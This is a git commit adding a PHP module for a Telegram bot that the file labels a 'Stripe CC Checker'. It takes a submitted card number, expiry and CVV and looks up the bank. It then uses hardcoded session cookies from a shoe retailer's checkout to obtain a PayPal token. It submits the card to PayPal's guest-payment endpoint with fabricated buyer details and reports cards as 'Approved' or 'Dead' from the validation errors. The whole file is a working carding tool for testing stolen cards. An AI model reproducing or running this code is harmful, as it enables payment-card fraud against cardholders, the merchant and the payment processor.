abb6e4e2fec51d8632aea8dacfcde67b408909a4
CxXIPX <117856394+CxXIPX@users.noreply.github.com>
2022-11-09 13:34:35 -0500

    Create ss.php

---
+++ modules/checker/ss.php
@@ -0,0 +1,242 @@
+<?php
+
+/*
+
+///==[Stripe CC Checker Commands]==///
+
+/ss creditcard - Checks the Credit Card
+
+*/
+
+
+include __DIR__."/../config/config.php";
+include __DIR__."/../config/variables.php";
+include_once __DIR__."/../functions/bot.php";
+include_once __DIR__."/../functions/db.php";
+include_once __DIR__."/../functions/functions.php";
+require_once("curl.php");
+
+////////////====[MUTE]====////////////
+if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
+    $antispam = antispamCheck($userId);
+    addUser($userId);
+    
+    if($antispam != False){
+      bot('sendmessage',[
+        'chat_id'=>$chat_id,
+        'text'=>"[<u>ANTI SPAM</u>] Intente mas tarde asaroso<b>$antispam</b>s.",
+        'parse_mode'=>'html',
+        'reply_to_message_id'=> $message_id
+      ]);
+      return;
+
+    }else{
+        $messageidtoedit1 = bot('sendmessage',[
+          'chat_id'=>$chat_id,
+          'text'=>"<b>Procesando tarjeta espere unos segundos....</b>",
+          'parse_mode'=>'html',
+          'reply_to_message_id'=> $message_id
+
+        ]);
+
+        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
+        $lista = substr($message, 4);
+        $bin = substr($cc, 0, 6);
+        
+        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
+            $creditcard = $matches[0][0];
+            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
+            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
+            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
+            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
+        
+
+            ###CHECKER PART###  
+            $zip = rand(10001,90045);
+            $time = rand(30000,699999);
+            $rand = rand(0,99999);
+            $pass = rand(0000000000,9999999999);
+            $email = substr(md5(mt_rand()), 0, 7);
+            $name = substr(md5(mt_rand()), 0, 7);
+            $last = substr(md5(mt_rand()), 0, 7);
+
+            $Vyper = new Vyper();
+
+
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            'Host: lookup.binlist.net',
+            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+            $fim = curl_exec($ch);
+            $bank = capture($fim, '"bank":{"name":"', '"');
+            $cname = capture($fim, '"name":"', '"');
+            $brand = capture($fim, '"brand":"', '"');
+            $country = capture($fim, '"country":{"name":"', '"');
+            $phone = capture($fim, '"phone":"', '"');
+            $scheme = capture($fim, '"scheme":"', '"');
+            $type = capture($fim, '"type":"', '"');
+            $emoji = capture($fim, '"emoji":"', '"');
+            $currency = capture($fim, '"currency":"', '"');
+            $binlenth = strlen($bin);
+            $schemename = ucfirst("$scheme");
+            $typename = ucfirst("$type");
+            
+            
+            /////////////////////==========[Unavailable if empty]==========////////////////
+            
+            
+            if (empty($schemename)) {
+            	$schemename = "Unavailable";
+            }
+            if (empty($typename)) {
+            	$typename = "Unavailable";
+            }
+            if (empty($brand)) {
+            	$brand = "Unavailable";
+            }
+            if (empty($bank)) {
+            	$bank = "Unavailable";
+            }
+            if (empty($cname)) {
+            	$cname = "Unavailable";
+            }
+            if (empty($phone)) {
+            	$phone = "Unavailable";
+            }
+            
+        
+            $Vyper->sock();
+$headers = array(
+    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'cookie: mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; searchsuiteautocomplete=%7B%7D; mage-messages=; form_key=xPpiOgHRy5B9dWC4; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; PHPSESSID=98336252c88aee4e0dd538074ccf2fb2; mage-cache-sessid=true; private_content_version=d9979f9242ea292df1420abc73ea120a; section_data_ids=%7B%22cart%22%3A1667403283%2C%22directory-data%22%3A1667403283%7D',
+    'referer: https://fosters-shoes.com/cart',
+    'pragma: no-cache'
+);
+$Vyper->headers($headers);
+$url="https://fosters-shoes.com/checkout/cart/";
+$REQ['1'] = $Vyper->get($url);
+
+
+$url="https://fosters-shoes.com/paypal/express/getTokenData/";
+$data = "quote_id=lOZcsIu0QEIEHv0WyYxnrO4jVHVaAKz6&customer_id=&form_key=xPpiOgHRy5B9dWC4&button=1";
+$REQ['2'] = $Vyper->post($url,$data);
+$Tokenpp = Gets($REQ['2'], '"token":"','"');
+$headers = array(
+'accept: */*',
+'content-type: application/json',
+'origin: https://www.paypal.com',
+'x-app-name: standardcardfields',
+'x-country: US'
+);
+$Vyper->headers($headers);
+$url="https://www.paypal.com/graphql?fetch_credit_form_submit";
+$data='{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$Tokenpp.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"'.$cvv.'"},"phoneNumber":"'.$ph2.'","firstName":"'.$name1.'","lastName":"'.$name2.'","billingAddress":{"givenName":"'.$name1.'","familyName":"S","line1":"'.$line.'","line2":null,"city":"'.$city.'","state":"'.$state.'","postalCode":"'.$zip.'","country":"US"},"shippingAddress":{"givenName":"'.$name1.'","familyName":"S","line1":"'.$line.'","line2":null,"city":"'.$city.'","state":"'.$state.'","postalCode":"'.$zip.'","country":"US"},"email":"'.$Email1.'","currencyConversionType":"PAYPAL"},"operationName":null}';
+$result = $Vyper->post($url,$data);
+
+
+$Vyper->close();
+
+
+            $time = $info['total_time'];
+            $time = substr_replace($time, '',4);
+
+            ###END OF CHECKER PART###
+            
+            
+            if(strpos($result, '"field":"cardCvv","code":"INVALID_SECURITY_CODE"}],"message":"VALIDATION_ERROR"')) {
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -» INVALID SECURITY CODE CCN CARD ✅
+Response -» Approved
+Gateway -» Gateway TX
+Time -» <b>$time</b><b>s</b>
+
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
+
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/Superhellv'>Superhellv Creator Vyperchk.com</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+            elseif(strpos($result, '"code":"INVALID_BILLING_ADDRESS"}],"message":"VALIDATION_ERROR"')) {
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -»  AVS VERIFICATION FAILTURE CCN OR CVV CARD ✅
+Response -» Approved
+Gateway -» Gateway TX
+Time -» <b>$time</b><b>s</b>
+
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
+
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/Superhellv'>Superhellv Creator Vyperchk.com</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+            else{
+              bot('editMessageText',[
+                'chat_id'=>$chat_id,
+                'message_id'=>$messageidtoedit,
+                'text'=>"<b>Card:</b> <code>$lista</code>
+<b>Status -» Dead ❌
+Response -» Dead Card Invalid
+Gateway -» Stripe Auth 1
+Time -» <b>$time</b><b>s</b>
+
+------- Bin Info -------</b>
+<b>Bank -»</b> $bank
+<b>Brand -»</b> $schemename
+<b>Type -»</b> $typename
+<b>Currency -»</b> $currency
+<b>Country -»</b> $cname ($emoji - 💲$currency)
+<b>Issuers Contact -»</b> $phone
+<b>----------------------------</b>
+
+<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
+<b>Bot By: <a href='t.me/Superhellv'>Superhellv Creator Vyperchk.com</a></b>",
+                'parse_mode'=>'html',
+                'disable_web_page_preview'=>'true'
+                
+            ]);}
+          
+        }else{
+          bot('editMessageText',[
+              'chat_id'=>$chat_id,
+              'message_id'=>$messageidtoedit,
+              'text'=>"<b>Portese serio animal</b>",
+              'parse_mode'=>'html',
+              'disable_web_page_preview'=>'true'
+              
+          ]);
+      }
+    }
+}
+
+
+?>
